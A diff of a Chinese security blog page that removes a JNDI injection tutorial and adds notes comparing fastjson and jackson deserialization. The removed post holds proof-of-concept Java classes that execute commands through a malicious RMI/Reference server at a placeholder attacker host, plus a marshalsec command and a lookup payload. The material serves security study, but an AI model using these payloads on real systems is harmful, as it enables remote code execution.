@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>JNDI注入(InitialContext.lookup) | Godown_blog</title>
+  <title>fastjson jackson大区分 | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8100.png')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8113.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        JNDI注入(InitialContext.lookup)
+        fastjson jackson大区分
       </span>
     </div>
     
@@ -619,195 +619,46 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p>JNDI是一种命名服务，全称叫Java Naming and Directory Interface</p>
-<p>开发者可以讲JNDI API映射为特定的命名服务和目录系统。</p>
-<p>单纯的文字讲着可能很抽象，来看case</p>
-<p>RMI中，提供一个远程对象，并在客户端调用远程对象的方法，代码如下：</p>
-<h2 id="JNDI绑定RMI"><a href="#JNDI绑定RMI" class="headerlink" title="JNDI绑定RMI"></a>JNDI绑定RMI</h2><h3 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a>RMIServer</h3><ul>
-<li>一个公用的继承Remote的接口RemoteInterface</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+        <p>以下均指对json的反序列化过程</p>
+<h2 id="setter"><a href="#setter" class="headerlink" title="setter"></a>setter</h2><p>fastjson调用setter：遍历所有方法，找出所有满足setter要求的方法，再根据传入的json去反射调用</p>
+<p>jackson调用setter：直接对传入的json中的字段拼接上set，然后去取setter</p>
+<p>其实二者一样，但是fastjson不能调用私有和受保护setter，而jackson可以</p>
+<h2 id="getter"><a href="#getter" class="headerlink" title="getter"></a>getter</h2><p>fastjson调用getter：</p>
+<p>1、没有setter方法，有getter方法。且getter满足：参数长度为0，返回类型是属于Collection 或其子类、Map 或其子类、AtomicBoolean、AtomicInteger、AtomicLong的一种</p>
+<p>2、fastjson&gt;&#x3D;1.2.36 可用<code>$ref</code>调用getter</p>
+<p>解析函数里有JSON.toJSON，还会调用getter（parseObject）</p>
+<p>jackson调用getter：</p>
+<p>1、没有setter，有getter方法。可以直接反序列化调用</p>
+<p>2、jackson-databind&amp;core&amp;annotations&gt;&#x3D;2.13.3，通过POJONode调用getter</p>
+<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>fastjson调用构造方法：</p>
 <ul>
-<li>一个远程对象RemoteImpl</li>
+<li>如果存在无参构造方法，则将其作为构造方法</li>
+<li>否则使用参数数量最多且排在最前面的构造方法。</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<p>jackson调用构造方法：</p>
 <ul>
-<li>RMIServer，在里面新建了注册中心并绑定远程对象</li>
+<li>没有无参构造时：<ul>
+<li>按照顺序，如果有参构造的参数全，或者更多(就是有不存在的值)，这样还能正常运行</li>
+<li>如果参数不全则直接异常</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteImpl&quot;</span>, remoteImpl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a>RMIClient</h3><ul>
-<li>同上，公用的继承Remote的接口RemoteInterface</li>
+</li>
+<li>无参构造和有参构造方法都有的时候先走无参构造；   <ul>
+<li>无参构造需要set&#x2F;get方法来完成序列化和反序列化</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>RMIClient，获取注册中心，获取远程对象，并执行方法</li>
+</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteImpl</span> <span class="operator">=</span> (RemoteInterface) registry.lookup(<span class="string">&quot;remoteImpl&quot;</span>);</span><br><span class="line">        System.out.println(remoteImpl.sayHello(<span class="string">&quot;RMI&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>而以上代码可以改成JNDI封装的形式，实现同样的功能</p>
-<h3 id="JNDIServer（RMI）"><a href="#JNDIServer（RMI）" class="headerlink" title="JNDIServer（RMI）"></a>JNDIServer（RMI）</h3><p>RemoteInterface、RemoteImpl、RMIServer的三个代码都不变，加一个JNDIServer进行封装</p>
-<ul>
-<li>JNDIServer。创建一个初始上下文，rebind重新绑定远程对象</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.rebind(<span class="string">&quot;rmi://localhost:1099/remoteImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先开RMIServer，再开JNDIServer</p>
-<h3 id="JNDIClient（RMI）"><a href="#JNDIClient（RMI）" class="headerlink" title="JNDIClient（RMI）"></a>JNDIClient（RMI）</h3><p>不再需要RMIClient，换成JNDIClient来调用</p>
-<ul>
-<li>JNDIClient</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDNIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteInterface) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteImpl&quot;</span>);</span><br><span class="line">        remoteObject.sayHello(<span class="string">&quot;JNDI&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>实现和RMIServer,RMIClient一样的效果</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925143636081.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925143636081.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>JNDI绑定RMI，实际上只是做了个封装，还是通过RMI来实现的。也就是说对RMI的攻击同样对JNDI绑定RMI的环境奏效</p>
-<p>JNDIServer打个断点</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144618924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144618924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟着你就发现，来到了RegistryImpl_Stub.rebind()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144730278.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144730278.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>同理，在RMIClient打个断点</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144820417.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144820417.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>来到了RegistryImpl_Stub.lookup()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144906185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925144906185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>完美符合RMI步骤</p>
-<p>RMI能打的都能打，只要在版本内</p>
-<h3 id="恶意RMI-Server"><a href="#恶意RMI-Server" class="headerlink" title="恶意RMI Server"></a>恶意RMI Server</h3><p>JDK&lt;&#x3D;8u121</p>
-<p>但这里还有个问题，假如说服务器有代码长JNDIClient这样，调用远程对象的方法，再假如lookup的参数我们可以控制</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteInterface) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteImpl&quot;</span>);</span><br><span class="line">remoteObject.sayHello(<span class="string">&quot;JNDI&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>是不是我们就能起一个恶意Server，让这个lookup加载我们的恶意远程类。No，因为RMI需要客户端和服务端拥有同一远程接口。比如这个case，我们开盲盒没办法知道RemoteInterface的代码。当然如果你知道的话，就能这么打</p>
-<p>攻击机：</p>
-<p>需要有RMIServer、和服务器相同的RemoteInterface接口。</p>
-<p>另外多出一个恶意对象和恶意JNDI服务</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilJNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.rebind(<span class="string">&quot;rmi://vpsip:port/remoteImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">RuntimeEvil</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>服务器：</p>
-<p>控制lookup参数为<code>rmi://vpsip:port/remoteImpl</code>，必须要调用sayHello才能命令执行</p>
-<p>而RMI就不能这么打，因为RMI中我们不能控制URL，需要多一个获取注册中心的部分，但是当然可以JRMP打</p>
-<h2 id="JNDI绑定Reference"><a href="#JNDI绑定Reference" class="headerlink" title="JNDI绑定Reference"></a>JNDI绑定Reference</h2><p>服务端同样需要RemoteInterface、RemoteImpl、RMIServer</p>
-<p>JNDIServer换个方式绑定罢了，看到上面加载RuntimeEvil的例子了吗，需要知道服务器RemoteInterface的代码，并继承UnicastRemoteObject。而经过Reference封装就不用</p>
-<h3 id="恶意-Reference-Server"><a href="#恶意-Reference-Server" class="headerlink" title="恶意 Reference Server"></a>恶意 Reference Server</h3><p>RuntimeEvil.class</p>
-<p>我们的类在实例化后不能转化为ObjectFactory<code>(ObjectFactory) clas.newInstance()</code>。让我们的类继承ObjectFactory即可。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>需要在RuntimeEvil.class所在路径开一个http服务 </p>
-<p><code>python -m http.server 8888</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIReferenceServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;RuntimeEvil&quot;</span>, <span class="string">&quot;RuntimeEvil&quot;</span>, <span class="string">&quot;http://localhost:8888/&quot;</span>);</span><br><span class="line">        context.rebind(<span class="string">&quot;rmi://localhost:1099/remoteImpl&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>JNDIClient执行lookup就能弹计算器</p>
-<blockquote>
-<p>新RuntimeEvil.class为什么Reference版的执行命令是写在构造函数，而RMI版命令执行代码是写在实现方法sayHello里面呢？</p>
-</blockquote>
-<p>来看代码：</p>
-<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>在JNDIReferenceServer的rebind方法打上断点：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163542911.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163542911.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟进去发现，在RegistryContext.rebind内，调用RegistryImpl_Stub.rebind进行绑定的对象，是用encodeObject封装过的</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163649452.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163649452.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟进encodeObject，看到，如果绑定的类是Reference类型，则会用RefrenceWrapper封装</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163852311.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925163852311.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>OK，恢复程序，再到客户端lookup打上断点</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164116719.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164116719.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟到RegistryContext.lookup内，调用RegistryImpl_Stub.lookup后，调用decodeObject解封装</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164243051.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164243051.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>如果需要查询的对象是RemoteReference类型，则用调用getRefrence()获取，紧跟着调用NameManger.getObjectInstance</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164450260.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164450260.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>执行完getReference后，已经变成了我们Server新建的Reference对象。那NameManger.getObjectInstance一定是解析Reference了</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164725973.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164725973.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>没错，NameManger.getObjectInstance内调用了getObjectFactoryFromRefrence和factory.getObjectInstance</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164948551.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925164948551.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>getObjectFactoryFromReference内，先调了个helper.loadClass</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165215328.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165215328.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟进去发现就是用AppClassLoader来加载类，也就是在本地Path找找有没有这个远程类</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165338524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165338524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>loadClass后，紧接着就是从codebase加载类，这里codebase就是我们提供的http路径</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165536631.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165536631.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>最后newInstance创建实例并返回</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165553736.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165553736.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>So，RMI只是返回了创建好的实例。如果JNDI绑定的是Reference，则会传递RefrenceWrapper封装的类，在客户端上解封装并从factoryLocation加载类并实例化。</p>
-<p>如果不是Reference，当然不会在客户端实例化，也就不会调用构造函数</p>
-<p>上述JNDI+RMI可以用marshalsec来起</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:<span class="comment">//127.0.0.1:8888/#RuntimeEvil 1099</span></span><br></pre></td></tr></table></figure>
-
-<p>默认RMI为1099</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925174614914.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925174614914.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>lookup payload：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmi:<span class="comment">//127.0.0.1:1099/#RuntimeEvil</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="JNDI-other"><a href="#JNDI-other" class="headerlink" title="JNDI other"></a>JNDI other</h2><p>JNDI支持四种协议，如下表。</p>
-<table>
-<thead>
-<tr>
-<th>协议</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>LDAP</td>
-<td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>
-</tr>
-<tr>
-<td>RMI</td>
-<td>JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td>
-</tr>
-<tr>
-<td>DNS</td>
-<td>域名服务</td>
-</tr>
-<tr>
-<td>CORBA</td>
-<td>公共对象请求代理体系结构</td>
-</tr>
-</tbody></table>
-<p>其中LDAP,RMI,CORBA都支持加载远程对象并实例化</p>
-<p>根据不同的协议，这里获取到的Context不同</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171820187.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171820187.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171844532.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925171844532.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>比如RMI是获取到RegistryContext.class</p>
-<ul>
-<li>8u121修复</li>
-</ul>
-<p>jdni在8u121后，在加载factoryLocation时，对远程codebase不再信赖，默认trustURLCodebase为false。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">不过只加了RMI和CORBA的，LDAP依旧能打，详情自己去LDAPctx文件跟</p>
-<p>如果你要用ldap服务打，相应的就要改RMIServer为LDAPServer：</p>
-<p>直接抄一个，因为LDAP服务不是java特有的，其他语言也在用的一个轻型目录访问协议（Lightweight Directory Access Protocol），图方便可以用marshalsec起</p>
